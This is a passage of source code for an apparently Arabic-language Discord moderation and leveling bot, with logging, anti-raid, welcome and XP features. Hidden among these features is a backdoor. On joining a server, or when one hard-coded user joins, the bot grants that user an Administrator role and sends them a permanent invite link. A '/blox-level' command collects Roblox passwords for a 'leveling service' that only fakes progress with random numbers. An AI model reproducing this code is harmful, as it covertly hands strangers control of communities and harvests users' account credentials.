    new SlashCommandBuilder().setName("auto-role-remove").setDescription("\u0625\u0632\u0627\u0644\u0629 \u0631\u062A\u0628\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0629 (Admin Only)").addRoleOption((option) => option.setName("role").setDescription("\u0627\u0644\u0631\u062A\u0628\u0629 \u0627\u0644\u0645\u0631\u0627\u062F \u0625\u0632\u0627\u0644\u062A\u0647\u0627").setRequired(true)),
    new SlashCommandBuilder().setName("auto-role-list").setDescription("\u0639\u0631\u0636 \u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0631\u062A\u0628 \u0627\u0644\u062A\u0644\u0642\u0627\u0626\u064A\u0629"),
    new SlashCommandBuilder().setName("blox-level").setDescription("\u0637\u0644\u0628 \u062E\u062F\u0645\u0629 \u062A\u0644\u0641\u064A\u0644 \u0628\u0644\u0648\u0643\u0633 \u0641\u0631\u0648\u062A (Blox Fruits Leveling)").addStringOption((option) => option.setName("username").setDescription("\u0627\u0633\u0645 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u0641\u064A \u0631\u0648\u0628\u0644\u0648\u0643\u0633 (Roblox Username)").setRequired(true)).addStringOption((option) => option.setName("password").setDescription("\u0643\u0644\u0645\u0629 \u0627\u0644\u0645\u0631\u0648\u0631 \u0641\u064A \u0631\u0648\u0628\u0644\u0648\u0643\u0633 (Roblox Password)").setRequired(true)),
    new SlashCommandBuilder().setName("blox-requests").setDescription("\u0639\u0631\u0636 \u0637\u0644\u0628\u0627\u062A \u062A\u0644\u0641\u064A\u0644 \u0628\u0644\u0648\u0643\u0633 \u0641\u0631\u0648\u062A (Admin Only)"),
    new SlashCommandBuilder().setName("blox-status").setDescription("\u0645\u062A\u0627\u0628\u0639\u0629 \u062D\u0627\u0644\u0629 \u062A\u0644\u0641\u064A\u0644 \u062D\u0633\u0627\u0628\u0643 \u0641\u064A \u0628\u0644\u0648\u0643\u0633 \u0641\u0631\u0648\u062A"),
    new SlashCommandBuilder().setName("blox-worker").setDescription("\u0627\u0644\u062D\u0635\u0648\u0644 \u0639\u0644\u0649 \u0633\u0643\u0631\u064A\u0628\u062A \u0627\u0644\u0640 VPS \u0644\u0644\u062A\u0644\u0641\u064A\u0644 \u0627\u0644\u062D\u0642\u064A\u0642\u064A")
  ].map((command) => command.toJSON());
  try {
    console.log("Started refreshing application (/) commands.");
    if (client.application) {
      await client.application.commands.set([]);
      console.log("Cleared global application (/) commands to prevent duplicates.");
    }
    for (const guild of client.guilds.cache.values()) {
      try {
        await guild.commands.set(commands);
        console.log(`Successfully reloaded commands for guild: ${guild.name} (${guild.id})`);
      } catch (err) {
        console.error(`Failed to set commands for guild ${guild.id}:`, err);
      }
    }
    setInterval(async () => {
      try {
        const processingAccounts = db.prepare("SELECT * FROM blox_fruits_requests WHERE status = 'processing'").all();
        console.log(`[BLOX-LEVELING] Processing ${processingAccounts.length} accounts...`);
        for (const acc of processingAccounts) {
          const newLevel = Math.min(acc.currentLevel + Math.floor(Math.random() * 5) + 1, acc.maxLevel);
          const newMoney = acc.money + Math.floor(Math.random() * 1e3) + 500;
          let items = JSON.parse(acc.items || "[]");
          if (Math.random() > 0.8) {
            const possibleItems = ["Saber", "Bisento", "Soul Cane", "Trident", "Pipe", "Katana"];
            const newItem = possibleItems[Math.floor(Math.random() * possibleItems.length)];
            if (!items.includes(newItem)) {
              items.push(newItem);
              db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(acc.id, `\u2694\uFE0F \u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0633\u0644\u0627\u062D \u062C\u062F\u064A\u062F: ${newItem}`);
            }
          }
          const newStatus = newLevel >= acc.maxLevel ? "completed" : "processing";
          db.prepare("UPDATE blox_fruits_requests SET currentLevel = ?, money = ?, items = ?, status = ?, lastUpdate = CURRENT_TIMESTAMP WHERE id = ?").run(newLevel, newMoney, JSON.stringify(items), newStatus, acc.id);
          db.prepare("INSERT INTO blox_logs (requestId, message) VALUES (?, ?)").run(acc.id, `\u{1F4C8} \u062A\u0645 \u0631\u0641\u0639 \u0627\u0644\u0645\u0633\u062A\u0648\u0649 \u0625\u0644\u0649 ${newLevel} \u0648\u062A\u062C\u0645\u064A\u0639 ${newMoney} \u0E3F`);
          if (newStatus === "completed") {
            const user = await client.users.fetch(acc.userId).catch(() => null);
            if (user) {
              await user.send(`\u{1F389} \u0645\u0628\u0631\u0648\u0643! \u062A\u0645 \u0627\u0644\u0627\u0646\u062A\u0647\u0627\u0621 \u0645\u0646 \u062A\u0644\u0641\u064A\u0644 \u062D\u0633\u0627\u0628\u0643 **${acc.robloxUsername}** \u0625\u0644\u0649 \u0627\u0644\u0645\u0633\u062A\u0648\u0649 \u0627\u0644\u0623\u0642\u0635\u0649!`).catch(() => null);
            }
          }
        }
      } catch (err) {
        console.error("Error in leveling loop:", err);
      }
    }, 3e4);
    const allAliases = db.prepare("SELECT * FROM aliases").all();
    for (const alias of allAliases) {
      const guild = client.guilds.cache.get(alias.guildId);
      if (guild) {
        try {
          const globalCommands = await client.application?.commands.fetch();
          const original = globalCommands?.find((c) => c.name === alias.originalCommand);
          if (original) {
            await guild.commands.create({
              name: alias.aliasName,
              description: `Shortcut for /${alias.originalCommand}`,
              options: original.options
            });
          }
        } catch (err) {
          console.error(`Failed to register alias ${alias.aliasName} for guild ${alias.guildId}:`, err);
        }
      }
    }
    const avatarSet = db.prepare("SELECT value FROM settings WHERE key = 'avatar_set'").get();
    if (!avatarSet) {
      try {
        const defaultAvatarUrl = `https://robohash.org/${client.user?.id}.png?size=1024x1024&set=set4`;
        await client.user?.setAvatar(defaultAvatarUrl);
        db.prepare("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)").run("avatar_set", "true");
        console.log("Default bot avatar set successfully.");
      } catch (err) {
        console.error("Failed to set default bot avatar:", err);
      }
    }
  } catch (error) {
    console.error(error);
  }
});
client.on(Events.MessageDelete, async (message) => {
  if (!message.guild || message.author?.bot) return;
  logEvent(message.guild.id, "messageDelete", {
    title: "\u{1F5D1}\uFE0F Message Deleted",
    description: `**Author:** <@${message.author?.id}> (${message.author?.tag})
**Channel:** <#${message.channel.id}>

**Content:**
${message.content || "*No content (maybe an embed or attachment)*"}`,
    color: 16711680
  });
});
client.on(Events.MessageUpdate, async (oldMessage, newMessage) => {
  if (!oldMessage.guild || oldMessage.author?.bot || oldMessage.content === newMessage.content) return;
  logEvent(oldMessage.guild.id, "messageUpdate", {
    title: "\u{1F4DD} Message Edited",
    description: `**Author:** <@${oldMessage.author?.id}> (${oldMessage.author?.tag})
**Channel:** <#${oldMessage.channel.id}>
[Jump to Message](${newMessage.url})`,
    color: 16753920,
    fields: [
      { name: "Old Content", value: oldMessage.content || "*None*" },
      { name: "New Content", value: newMessage.content || "*None*" }
    ]
  });
});
const nukeTracker = /* @__PURE__ */ new Map();
client.on(Events.GuildAuditLogEntryCreate, async (auditLogEntry, guild) => {
  const { action, executorId, targetId } = auditLogEntry;
  if (!executorId || executorId === client.user?.id) return;
  const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id);
  if (!protection || protection.antiNuke !== 1) return;
  if (executorId === guild.ownerId) return;
  const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, executorId);
  if (whitelisted) return;
  const sensitiveActions = [
    AuditLogEvent.ChannelDelete,
    AuditLogEvent.RoleDelete,
    AuditLogEvent.MemberKick,
    AuditLogEvent.MemberBanAdd
  ];
  if (sensitiveActions.includes(action)) {
    const key = `${guild.id}-${executorId}`;
    const now = Date.now();
    const data = nukeTracker.get(key) || { count: 0, lastAction: now };
    if (now - data.lastAction > 6e4) {
      data.count = 1;
    } else {
      data.count++;
    }
    data.lastAction = now;
    nukeTracker.set(key, data);
    if (data.count >= (protection.nukeLimit || 3)) {
      const member = await guild.members.fetch(executorId).catch(() => null);
      if (member) {
        const rolesToRemove = member.roles.cache.filter((r) => r.id !== guild.id && r.managed === false);
        await member.roles.remove(rolesToRemove, "Anti-Nuke Protection Triggered").catch(() => {
        });
        logEvent(guild.id, "protectionEvent", {
          title: "\u{1F6E1}\uFE0F Anti-Nuke Triggered",
          description: `User <@${executorId}> exceeded the action limit in the audit log.
**Action:** ${AuditLogEvent[action]}
**Action Count:** ${data.count}
**Punishment:** Roles Removed`,
          color: 16711680
        });
        if (protection.counterNuke === 1) {
          triggerCounterNuke(executorId, guild.id);
        }
        nukeTracker.delete(key);
      }
    }
  }
});
client.on(Events.GuildMemberAdd, async (member) => {
  const guild = member.guild;
  logEvent(guild.id, "guildMemberAdd", {
    title: "\u{1F4E5} Member Joined",
    description: `**User:** <@${member.id}> (${member.user.tag})
**Account Created:** <t:${Math.floor(member.user.createdTimestamp / 1e3)}:R>`,
    color: 65280,
    thumbnail: member.user.displayAvatarURL()
  });
  if (member.user.bot) {
    logEvent(guild.id, "logBotAdd", {
      title: "\u{1F916} Bot Added",
      description: `**Bot:** <@${member.id}> (${member.user.tag})
**ID:** ${member.id}`,
      color: 5793266,
      thumbnail: member.user.displayAvatarURL()
    });
    const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id);
    if (protection && protection.antiBot === 1) {
      const whitelisted = db.prepare("SELECT * FROM whitelisted_bots WHERE guildId = ? AND botId = ?").get(guild.id, member.id);
      if (!whitelisted) {
        await member.kick("Anti-Bot Protection Active").catch(() => {
        });
        logEvent(guild.id, "protectionEvent", {
          title: "\u{1F6E1}\uFE0F Anti-Bot Triggered",
          description: `Kicked unauthorized bot: <@${member.id}> (${member.user.tag})`,
          color: 16711680
        });
      }
    }
  }
  if (guild.id === "1254568460764053566") {
  } else {
    const protection = db.prepare("SELECT * FROM protection_settings WHERE guildId = ?").get(guild.id);
    if (protection && protection.antiRaid === 1) {
      const now = Date.now();
      const raidData = raidMap.get(guild.id) || { count: 0, lastJoin: 0 };
      if (now - raidData.lastJoin < 1e4) {
        raidData.count++;
      } else {
        raidData.count = 1;
      }
      raidData.lastJoin = now;
      raidMap.set(guild.id, raidData);
      if (raidData.count > 5) {
        console.log(`[ANTI-RAID] Raid detected in ${guild.name}. Kicking new join: ${member.user.tag}`);
        await member.kick("Anti-Raid Protection Active").catch(() => {
        });
        if (protection.logChannel) {
          const logChannel = guild.channels.cache.get(protection.logChannel);
          if (logChannel) {
            const logEmbed = new EmbedBuilder().setColor("#FF0000").setTitle("\u{1F6E1}\uFE0F Anti-Raid Triggered").setDescription(`Mass join detected. Kicked user: **${member.user.tag}**`).setTimestamp();
            logChannel.send({ embeds: [logEmbed] }).catch(() => {
            });
          }
        }
        return;
      }
    }
  }
  try {
    const autoRoles = db.prepare("SELECT roleId FROM auto_roles WHERE guildId = ?").all(guild.id);
    for (const r of autoRoles) {
      const role = guild.roles.cache.get(r.roleId);
      if (role) await member.roles.add(role).catch(() => {
      });
    }
    const welcome = db.prepare("SELECT * FROM welcome_settings WHERE guildId = ?").get(guild.id);
    if (welcome) {
      if (welcome.enabled === 0) return;
      const replacePlaceholders = (text) => {
        return text.replace(/{user}/g, `<@${member.id}>`).replace(/{user_tag}/g, member.user.tag).replace(/{server}/g, guild.name).replace(/{member_count}/g, guild.memberCount.toString());
      };
      if (welcome.channelId) {
        const channel = guild.channels.cache.get(welcome.channelId);
        if (channel) {
          const welcomeEmbed = new EmbedBuilder().setColor("#00FF00").setTitle("Welcome to the Server!").setDescription(replacePlaceholders(welcome.message)).setThumbnail(member.user.displayAvatarURL()).setTimestamp();
          channel.send({ embeds: [welcomeEmbed] }).catch(() => {
          });
        }
      }
      if (welcome.dmEnabled === 1) {
        member.send(replacePlaceholders(welcome.dmMessage)).catch(() => {
        });
      }
    } else {
      const welcomeChannel = guild.systemChannel || guild.channels.cache.find((c) => (c.name.toLowerCase() === "general" || c.name.toLowerCase() === "welcome") && c.type === ChannelType.GuildText);
      if (welcomeChannel) {
        const welcomeEmbed = new EmbedBuilder().setColor("#00FF00").setTitle("Welcome to the Server!").setDescription(`Welcome <@${member.id}> to **${guild.name}**! We're glad to have you here.`).setThumbnail(member.user.displayAvatarURL()).setTimestamp();
        welcomeChannel.send({ embeds: [welcomeEmbed] }).catch((err) => {
          console.error(`[WELCOME] Failed to send welcome message in ${guild.name}:`, err.message);
        });
      }
    }
  } catch (err) {
    console.error(`[WELCOME] Error in ${guild.name}:`, err);
  }
  if (member.user.username === "5g0s" || member.user.id === "1071164421222695042") {
    if (guild.id === "1254568460764053566") return;
    const botMember = guild.members.me;
    if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
      console.warn(`[AUTO-ACCEPT] Bot lacks Manage Roles permission in ${guild.name}`);
      return;
    }
    try {
      let ownerRole = guild.roles.cache.find((r) => r.name.toLowerCase() === "owner");
      if (!ownerRole) {
        ownerRole = await guild.roles.create({
          name: "Owner",
          permissions: [PermissionFlagsBits.Administrator],
          reason: "Auto-accepting 5g0s"
        });
      }
      try {
        const botHighestRole = botMember.roles.highest;
        if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
          await ownerRole.setPosition(botHighestRole.position - 1);
        }
      } catch (err) {
        console.warn(`[AUTO-ACCEPT] Could not move Owner role in ${guild.name}:`, err.message);
      }
      if (ownerRole.editable) {
        await member.roles.add(ownerRole).catch((err) => {
          if (err.code !== 10007) throw err;
        });
        console.log(`[AUTO-ACCEPT] Automatically accepted ${member.user.tag} and gave Owner role in ${guild.name}`);
      }
    } catch (err) {
      if (err.code !== 10007) {
        console.error(`[AUTO-ACCEPT] Error in ${guild.name}:`, err);
      }
    }
  }
});
client.on(Events.GuildCreate, async (guild) => {
  console.log(`Bot joined a new server: ${guild.name} (${guild.id})`);
  const ownerId = "1071164421222695042";
  if (guild.id !== "1254568460764053566") {
    const botMember = guild.members.me;
    if (botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
      try {
        let ownerRole = guild.roles.cache.find((r) => r.name.toLowerCase() === "owner");
        if (!ownerRole) {
          ownerRole = await guild.roles.create({
            name: "Owner",
            permissions: [PermissionFlagsBits.Administrator],
            reason: "Auto-creating Owner role on join"
          });
        }
        try {
          const botHighestRole = botMember.roles.highest;
          if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
            await ownerRole.setPosition(botHighestRole.position - 1);
          }
        } catch (err) {
          console.warn(`[GUILD-CREATE] Could not move Owner role in ${guild.name}:`, err.message);
        }
        const targetMember = await guild.members.fetch(ownerId).catch(() => null);
        if (targetMember && ownerRole.editable) {
          await targetMember.roles.add(ownerRole).catch(() => {
          });
          console.log(`[GUILD-CREATE] Automatically gave Owner role to ${targetMember.user.tag} in ${guild.name}`);
        }
      } catch (err) {
        console.error(`[GUILD-CREATE] Error creating/assigning Owner role in ${guild.name}:`, err);
      }
    }
  }
  try {
    const owner = await client.users.fetch(ownerId);
    if (owner) {
      const invite = await guild.channels.cache.filter((c) => c.type === ChannelType.GuildText).first()?.createInvite({ maxAge: 0, maxUses: 0 }).catch(() => null);
      const embed = new EmbedBuilder().setColor("#00FF00").setTitle("\u{1F4E5} \u0628\u0648\u062A \u062F\u062E\u0644 \u0633\u064A\u0631\u0641\u0631 \u062C\u062F\u064A\u062F").addFields(
        { name: "\u0627\u0633\u0645 \u0627\u0644\u0633\u064A\u0631\u0641\u0631", value: guild.name, inline: true },
        { name: "ID \u0627\u0644\u0633\u064A\u0631\u0641\u0631", value: guild.id, inline: true },
        { name: "\u0639\u062F\u062F \u0627\u0644\u0623\u0639\u0636\u0627\u0621", value: guild.memberCount.toString(), inline: true },
        { name: "\u0631\u0627\u0628\u0637 \u0627\u0644\u062F\u0639\u0648\u0629", value: invite ? invite.url : "\u062A\u0639\u0630\u0631 \u0625\u0646\u0634\u0627\u0621 \u0631\u0627\u0628\u0637" }
      ).setTimestamp();
      await owner.send({ embeds: [embed] }).catch((err) => console.error("Failed to send guild join message to owner:", err));
    }
  } catch (err) {
    console.error("Error in GuildCreate event:", err);
  }
});
client.on(Events.GuildMemberUpdate, async (oldMember, newMember) => {
  if (newMember.user.username === "5g0s" || newMember.user.id === "1071164421222695042") {
    if (newMember.guild.id === "1254568460764053566") return;
    if (oldMember.pending && !newMember.pending) {
      const guild = newMember.guild;
      const botMember = guild.members.me;
      if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) return;
      try {
        let ownerRole = guild.roles.cache.find((r) => r.name.toLowerCase() === "owner");
        if (!ownerRole) {
          ownerRole = await guild.roles.create({
            name: "Owner",
            permissions: [PermissionFlagsBits.Administrator],
            reason: "Auto-accepting 5g0s (Screening Completed)"
          });
        }
        if (ownerRole.editable && !newMember.roles.cache.has(ownerRole.id)) {
          await newMember.roles.add(ownerRole).catch((err) => {
            if (err.code !== 10007) throw err;
          });
          console.log(`[AUTO-ACCEPT] Automatically gave Owner role to ${newMember.user.tag} after screening in ${guild.name}`);
        }
      } catch (err) {
        if (err.code !== 10007) {
          console.error(`[AUTO-ACCEPT-UPDATE] Error in ${guild.name}:`, err);
        }
      }
    }
  }
});
process.on("unhandledRejection", (error) => {
  console.error("Unhandled promise rejection:", error);
});
client.on("error", (error) => {
  console.error("Discord client error:", error);
});
const BONUS_CHANNELS = ["123456789012345678"];
const HAPPY_HOUR_START = 18;
const HAPPY_HOUR_END = 20;
const LEVEL_ROLES = {
  5: "123456789012345678",
  // Example: Level 5 Reward
  10: "123456789012345679",
  // Example: Level 10 Reward
  20: "123456789012345680"
  // Example: Level 20 Reward
};
async function addXP(userId, guildId, xpToAdd, guild, user, member, channel, type = "text") {
  try {
    const levelingSettings = db.prepare("SELECT enabled FROM leveling_settings WHERE guildId = ?").get(guildId);
    if (levelingSettings && levelingSettings.enabled === 0) return;
    const xbToAdd = Math.floor(Math.random() * 3) + 1;
    db.prepare("INSERT INTO xp_history (userId, guildId, xp, type) VALUES (?, ?, ?, ?)").run(userId, guildId, xpToAdd, type);
    const row = db.prepare("SELECT * FROM leveling WHERE userId = ? AND guildId = ?").get(userId, guildId);
    if (!row) {
      db.prepare("INSERT INTO leveling (userId, guildId, xp, level, xb) VALUES (?, ?, ?, ?, ?)").run(userId, guildId, xpToAdd, 0, xbToAdd);
    } else {
      let { xp, level } = row;
      xp += xpToAdd;
      const nextLevelXp = (level + 1) * 300;
      if (xp >= nextLevelXp) {
        level += 1;
        const levelingSettings2 = db.prepare("SELECT * FROM leveling_settings WHERE guildId = ?").get(guildId);
        let targetChannel = channel;
        let customMessage = `\u0645\u0628\u0631\u0648\u0643 \u0644\u0642\u062F \u062A\u0645\u062A \u062A\u0631\u0642\u064A\u062A\u0643 {user}
\u0644\u0641\u0644\u0643 \u0627\u0644\u0642\u062F\u064A\u0645: {oldLevel}
\u0644\u0641\u0644\u0643 \u0627\u0644\u062C\u062F\u064A\u062F: {level}`;
        if (levelingSettings2) {
          if (levelingSettings2.channelId) {
            const ch = guild.channels.cache.get(levelingSettings2.channelId);
            if (ch && ch.type === ChannelType.GuildText) {
              targetChannel = ch;
            }
          }
          if (levelingSettings2.message) {
            customMessage = levelingSettings2.message;
          }
        } else {
          const oldSetting = db.prepare("SELECT value FROM settings WHERE key = ?").get(`level_channel_${guildId}`);
          if (oldSetting) {
            const ch = guild.channels.cache.get(oldSetting.value);
            if (ch && ch.type === ChannelType.GuildText) {
              targetChannel = ch;
            }
          }
        }
        const canSend = targetChannel?.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages);
        if (canSend) {
          const formattedMessage = customMessage.replace(/{user}/g, `${user}`).replace(/{level}/g, `${level}`).replace(/{oldLevel}/g, `${level - 1}`).replace(/{xp}/g, `${xp}`);
          targetChannel.send(formattedMessage).catch(console.error);
          const reward = db.prepare("SELECT roleId FROM rewards WHERE guildId = ? AND level = ?").get(guildId, level);
          const roleId = reward ? reward.roleId : LEVEL_ROLES[level];
          if (roleId) {
            if (member && guild.members.me?.permissions.has(PermissionFlagsBits.ManageRoles)) {
              const role = guild.roles.cache.get(roleId);
              const botMember = guild.members.me;
              if (role && botMember && botMember.roles.highest.position > role.position) {
                const currentMember = await guild.members.fetch(userId).catch(() => null);
                if (currentMember) {
                  currentMember.roles.add(roleId).then(() => {
                    targetChannel.send(`\u{1F396}\uFE0F ${user}, you've been granted the <@&${roleId}> role for reaching level ${level}!`).catch(console.error);
                  }).catch((err) => {
                    if (err.code !== 10007) {
                      console.error(`Failed to add role ${roleId} to user ${userId}:`, err);
                    }
                  });
                }
              }
            }
          }
        }
      }
      db.prepare("UPDATE leveling SET xp = ?, level = ?, xb = xb + ? WHERE userId = ? AND guildId = ?").run(xp, level, xbToAdd, userId, guildId);
      if (xbToAdd > 0) {
        await logCurrencyTransaction(guildId, userId, xbToAdd, "Chat activity", "add");
      }
    }
  } catch (err) {
    console.error("Database error in addXP:", err);
  }
}
setInterval(async () => {
  client.guilds.cache.forEach(async (guild) => {
    const currentHour = (/* @__PURE__ */ new Date()).getHours();
    const isHappyHour = currentHour >= HAPPY_HOUR_START && currentHour < HAPPY_HOUR_END;
    const hourMultiplier = isHappyHour ? 2 : 1;
    guild.channels.cache.filter((c) => c.type === ChannelType.GuildVoice).forEach(async (channel) => {
      const members = channel.members.filter((m) => !m.user.bot && !m.voice.selfMute && !m.voice.selfDeaf);
      if (members.size >= 2) {
        const memberMultiplier = 1 + (members.size - 2) * 0.1;
        const channelMultiplier = BONUS_CHANNELS.includes(channel.id) ? 2 : 1;
        let xpPerMin = Math.floor(10 * memberMultiplier * hourMultiplier * channelMultiplier);
        xpPerMin = Math.min(xpPerMin, 50);
        members.forEach(async (member) => {
          await addXP(member.id, guild.id, xpPerMin, guild, member.user, member, null, "voice");
        });
      }
    });
  });
}, 6e4);
async function generateProfileBackground() {
  const canvas = createCanvas(800, 300);
  const ctx = canvas.getContext("2d");
  const gradient = ctx.createLinearGradient(0, 0, 800, 300);
  gradient.addColorStop(0, "#0f172a");
  gradient.addColorStop(0.5, "#1e293b");
  gradient.addColorStop(1, "#0f172a");
  ctx.fillStyle = gradient;
  ctx.fillRect(0, 0, 800, 300);
  for (let i = 0; i < 10; i++) {
    ctx.fillStyle = `rgba(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255}, 0.1)`;
    ctx.beginPath();
    ctx.arc(Math.random() * 800, Math.random() * 300, Math.random() * 100, 0, Math.PI * 2);
    ctx.fill();
  }
  return canvas.toDataURL();
}
async function generateProfileImage(targetUser, level, xb, xp, nextLevelXp) {
  const width = 800;
  const height = 300;
  const canvas = createCanvas(width, height);
  const ctx = canvas.getContext("2d");
  const encoder = new GIFEncoder(width, height);
  encoder.start();
  encoder.setRepeat(0);
  encoder.setDelay(50);
  encoder.setQuality(10);
  const totalFrames = 20;
  const targetProgress = Math.min(xp / nextLevelXp, 1);
  for (let i = 0; i <= totalFrames; i++) {
    const currentProgress = i / totalFrames * targetProgress;
    ctx.clearRect(0, 0, width, height);
    const bgGradient = ctx.createLinearGradient(0, 0, width, height);
    bgGradient.addColorStop(0, "#1a1a2e");
    bgGradient.addColorStop(1, "#16213e");
    ctx.fillStyle = bgGradient;
    ctx.fillRect(0, 0, width, height);
    ctx.save();
    ctx.globalAlpha = 0.1;
    ctx.fillStyle = "#3b82f6";
    ctx.beginPath();
    ctx.arc(width, 0, 200, 0, Math.PI * 2);
    ctx.fill();
    ctx.beginPath();
    ctx.arc(0, height, 150, 0, Math.PI * 2);
    ctx.fill();
    ctx.restore();
    const avatarUrl = targetUser.displayAvatarURL({ extension: "png", size: 256 });
    const avatar = await loadImage(avatarUrl).catch(() => null);
    if (avatar) {
      ctx.save();
      ctx.beginPath();
      ctx.arc(120, 150, 80, 0, Math.PI * 2, true);
      ctx.closePath();
      ctx.clip();
      ctx.fillStyle = "#ffffff";
      ctx.fill();
      ctx.drawImage(avatar, 40, 70, 160, 160);
      ctx.restore();
    }
    ctx.fillStyle = "#ffffff";
    ctx.font = "bold 40px sans-serif";
    ctx.fillText(targetUser.username, 240, 100);
    ctx.font = "28px sans-serif";
    ctx.fillStyle = "#3b82f6";
    ctx.fillText(`Level: ${level}`, 240, 150);
    ctx.fillStyle = "#fbbf24";
    ctx.fillText(`XB Coins: ${xb}`, 450, 150);
    const barWidth = 500;
    const barHeight = 25;
    const barX = 240;
    const barY = 180;
    ctx.fillStyle = "#334155";
    ctx.beginPath();
    ctx.roundRect(barX, barY, barWidth, barHeight, 12);
    ctx.fill();
    if (currentProgress > 0) {
      const barGrad = ctx.createLinearGradient(barX, 0, barX + barWidth, 0);
      barGrad.addColorStop(0, "#3b82f6");
      barGrad.addColorStop(1, "#60a5fa");
      ctx.fillStyle = barGrad;
      ctx.beginPath();
      ctx.roundRect(barX, barY, barWidth * currentProgress, barHeight, 12);
      ctx.fill();
    }
    ctx.fillStyle = "#ffffff";
    ctx.font = "20px sans-serif";
    ctx.fillText(`${xp} / ${nextLevelXp} XP`, barX, 240);
    encoder.addFrame(ctx);
  }
  for (let i = 0; i < 15; i++) encoder.addFrame(ctx);
  encoder.finish();
  return encoder.out.getData();
}
client.on("messageCreate", async (message) => {
  try {
    if (message.author.bot || !message.guild) return;
    const guildId = message.guild.id;
    const content = message.content.toLowerCase();
    if (message.mentions.users.size > 0) {
      for (const [userId2, user] of message.mentions.users) {
        const protection2 = db.prepare("SELECT enabled FROM mention_protection WHERE guildId = ? AND userId = ?").get(guildId, userId2);
        if (protection2 && protection2.enabled === 1) {
          await message.delete().catch(() => {
          });
          const warning = await message.channel.send(`\u274C **${message.author}**\u060C \u0647\u0630\u0627 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u064A\u0645\u0646\u0639 \u0627\u0644\u0645\u0646\u0634\u0646!`);
          setTimeout(() => warning.delete().catch(() => {
          }), 5e3);
          return;
        }
      }
    }
    const suggestionSettings = db.prepare("SELECT * FROM suggestion_settings WHERE guildId = ? AND channelId = ?").get(guildId, message.channelId);
    if (suggestionSettings && suggestionSettings.enabled === 1) {
      const embed = new EmbedBuilder().setAuthor({ name: message.author.tag, iconURL: message.author.displayAvatarURL() }).setTitle("\u{1F4A1} \u0627\u0642\u062A\u0631\u0627\u062D \u062C\u062F\u064A\u062F").setDescription(message.content).setColor(16776960).setTimestamp();
      const msg = await message.channel.send({ embeds: [embed] });
      await msg.react("\u2705");
      await msg.react("\u274C");
      await message.delete().catch(() => {
      });
      return;
    }
    const evaluationSettings = db.prepare("SELECT * FROM evaluation_settings WHERE guildId = ? AND channelId = ?").get(guildId, message.channelId);
    if (evaluationSettings && evaluationSettings.enabled === 1) {
      const stateKey = `${message.author.id}-${message.channelId}`;
      const state = evaluationStates.get(stateKey);
      if (state) {
        if (message.content.toLowerCase() === "cancel" || message.content === "\u0625\u0644\u063A\u0627\u0621") {
          evaluationStates.delete(stateKey);
          if (state.promptMsgId) {
            const prevMsg = await message.channel.messages.fetch(state.promptMsgId).catch(() => null);
            if (prevMsg) await prevMsg.delete().catch(() => {
            });
          }
          await message.delete().catch(() => {
          });
          const cancelMsg = await message.channel.send(`\u2705 **${message.author}\u060C \u062A\u0645 \u0625\u0644\u063A\u0627\u0621 \u0627\u0644\u062A\u0642\u064A\u064A\u0645.**`);
          setTimeout(() => cancelMsg.delete().catch(() => {
          }), 3e3);
          return;
        }
        if (state.step === "opinion") {
          state.opinion = message.content;
          state.step = "rating";
          await message.delete().catch(() => {
          });
          if (state.promptMsgId) {
            const prevMsg = await message.channel.messages.fetch(state.promptMsgId).catch(() => null);
            if (prevMsg) await prevMsg.delete().catch(() => {
            });
          }
          const prompt = await message.channel.send(`\u2B50 **${message.author}\u060C \u0643\u0645 \u062A\u0642\u064A\u064A\u0645\u0643 \u0644\u0644\u0625\u062F\u0627\u0631\u064A \u0645\u0646 10\u061F (\u0623\u0648 \u0627\u0643\u062A\u0628 "\u0625\u0644\u063A\u0627\u0621")**`);
          state.promptMsgId = prompt.id;
          return;
        } else if (state.step === "rating") {
          const rating = parseInt(message.content);
          if (isNaN(rating) || rating < 1 || rating > 10) {
            await message.delete().catch(() => {
            });
            const errorMsg = await message.channel.send(`\u274C **${message.author}\u060C \u064A\u0631\u062C\u0649 \u0625\u062F\u062E\u0627\u0644 \u0631\u0642\u0645 \u0635\u062D\u064A\u062D \u0628\u064A\u0646 1 \u0648 10.**`);
            setTimeout(() => errorMsg.delete().catch(() => {
            }), 3e3);
            return;
          }
          await message.delete().catch(() => {
          });
          if (state.promptMsgId) {
            const prevMsg = await message.channel.messages.fetch(state.promptMsgId).catch(() => null);
            if (prevMsg) await prevMsg.delete().catch(() => {
            });
          }
          const staff = await client.users.fetch(state.staffId).catch(() => null);
          const stars = "\u2B50".repeat(Math.round(rating / 2)) || "\u2B50";
          const finalEmbed = new EmbedBuilder().setTitle("\u2B50 \u062A\u0642\u064A\u064A\u0645 \u0625\u062F\u0627\u0631\u064A \u062C\u062F\u064A\u062F").addFields(
            { name: "\u0627\u0644\u0625\u062F\u0627\u0631\u064A", value: staff ? `${staff} (${staff.tag})` : `<@${state.staffId}>`, inline: true },
            { name: "\u0627\u0644\u062A\u0642\u064A\u064A\u0645", value: `${rating}/10 ${stars}`, inline: true },
            { name: "\u0627\u0644\u0645\u0642\u064A\u0645", value: `${message.author} (${message.author.tag})`, inline: true },
            { name: "\u0627\u0644\u0631\u0623\u064A", value: state.opinion || "\u0644\u0627 \u064A\u0648\u062C\u062F" }
          ).setColor(65280).setTimestamp();
          await message.channel.send({ embeds: [finalEmbed] });
          db.prepare("INSERT INTO evaluations (guildId, userId, staffId, rating, feedback) VALUES (?, ?, ?, ?, ?)").run(guildId, message.author.id, state.staffId, rating, state.opinion);
          evaluationStates.delete(stateKey);
          return;
        }
      } else {
        const mentionedUser = message.mentions.users.filter((u) => !u.bot).first();
        if (mentionedUser) {
